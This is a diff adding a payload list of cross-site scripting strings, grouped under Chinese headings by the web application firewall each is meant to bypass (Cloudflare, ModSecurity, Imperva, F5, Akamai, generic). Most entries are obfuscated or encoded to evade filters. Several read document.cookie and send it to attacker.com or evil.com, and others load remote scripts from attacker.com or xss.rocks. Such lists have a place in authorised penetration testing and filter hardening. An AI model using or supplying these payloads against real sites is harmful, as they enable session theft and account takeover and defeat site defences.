@@ -1,0 +1,69 @@
+# Cloudflare绕过
+<ScrIpT>prompt(1)</sCrIpT>
+<a/onmouseover=prompt(1)>XSS
+<a/href="j&#97v&#97script&#x3A;&#97lert(1)">XSS
+<svg/onload=confirm(String.fromCharCode(88,83,83))>
+<img/src="x"/onerror=document['cookie'];eval(atob('YWxlcnQoImNvb2tpZSBzdGVhbGVyIik7'));>
+<body/onwheel="[1].find(alert)">Roll ME
+<svg onload=setInterval`alert\u0028document.domain\u0029`>
+<x/onclick=document.location='http://xss.rocks/xss.js'>click me
+
+# ModSecurity绕过
+<details/open/ontoggle="alert`1`">XSS
+<a69/onclick=[1].map(alert)>XSS
+<IfRaMe/src=javascript:alert(1)>
+<l/onclick="[''].findIndex(alert)">l
+<%78%63%72%69%70%74>a=prompt;a(1);</%78%63%72%69%70%74>
+<img src=1 onerror="a=alert;a(1)">
+<img src=1 o&#x6e;error="javascript&colon;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;1&#x29;">
+
+# Imperva绕过
+<iframe/onload='this["src"]="javas&Tab;cript:document["locati&Tab;on"]["replace"]("https://evil.com/"+document["cookie"]);'>
+<img src=x:prompt(eval(atob('ZG9jdW1lbnQuY29va2ll')))>
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+<scrIPT x=">" SRC="https://attacker.com/xss.js"></scrIPT>
+<d3"<"/onclick="1>[confirm``]"<">d3
+
+# F5 BIG-IP绕过
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>XSS
+<input type="text" value="> " onkeydown="prompt(1)" autofocus ">
+<form><button formaction=javascript&colon;alert(1)>XSS
+<img/src='x'%0Aonerror=confirm`1`>
+
+# Akamai绕过
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">XSS</a>
+<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+<img src=``&NewLine; onerror=alert(1)&NewLine;``>
+<script>~'<script>'/**/;alert(1)//'</script>
+<style><script>a@import'//XSS.rocks'</script></style>
+
+# 通用WAF绕过
+<svg><animate onbegin=confirm() attributeName=x></svg>
+<script>$=1,$$='ale',$$$='rt',$$$$=`(1)`,eval($$+$$$+$$$$)</script>
+<details ontoggle=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>
+<img src=x onerror=\u0065\u0076\u0061\u006c('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')>
+<body onpageshow=top['ale'+'rt']('1')>
+<body onpageshow=function(){eval(String.fromCodePoint(97,108,101,114,116,40,49,41))}>
+<math><xss href="javascript:alert(1)">XSS
+<a href="j&X41vascript&colon;alert&lpar;1&rpar;">XSS
+<button autofocus onfocus=top[11000000..toString(36)[0]+628..toString(36)[1]+'ert'](1)></button>
+<img/src="x"/onerror=top['\141\154\145\162\164'](1)>
+<svg><script>+(x=>document[`body`].appendChild(document[`createElement`](`img`)).src=`https://attacker.com/c/`+document[`cookie`])()</script>
+<a href=&#01javascript:alert(1)>XSS
+<img src="x" onerror="window&#46;document&#46;location = '//attacker.com/' + document&#46;cookie;">
+<iframe srcdoc="<a href='javascript:alert(1)'>XSS</a>"></iframe>
+
+# 混淆和编码组合
+<img src=x onerror="Function(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))()">
+<body><template><s id=x onclick=alert()>XSS</s></template></body>
+<img src=x onerror=eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')>
+<A HREF="h&#x74t&#x70&#x3a&#x2f&#x2f&#x67o&#x6f&#x67&#x6c&#x65&#x2e&#x63&#x6f&#x6d">XSS</A>
+<body><textarea onkeyup='javascript:"\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e"'></textarea>
+<img%09onerror=alert(1) src=a>
+<i onclick=c&#39;onfirm(1)>click me</i>
+<div id="x">x</div><script>Object.prototype.BUMMER=1;document.getElementById('x').innerHTML='XSS'</script>
+<iframe src="javascript:(function(){var s=document.createElement('script');s.src='//attacker.com/hook.js';document.body.appendChild(s)})()"></iframe>
+<input autofocus onfocus="document.body.appendChild(document.createElement`img`).src='https://attacker.com/c/'+document.cookie">
+<math><mtext><option><FAKEELEMENT><math><option><annotation-xml encoding="text/html"><img src=x onerror=alert(1)><annotation-xml>
+<div id="div1"><input value="``onmouseover=alert(1)"></div><div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script> 
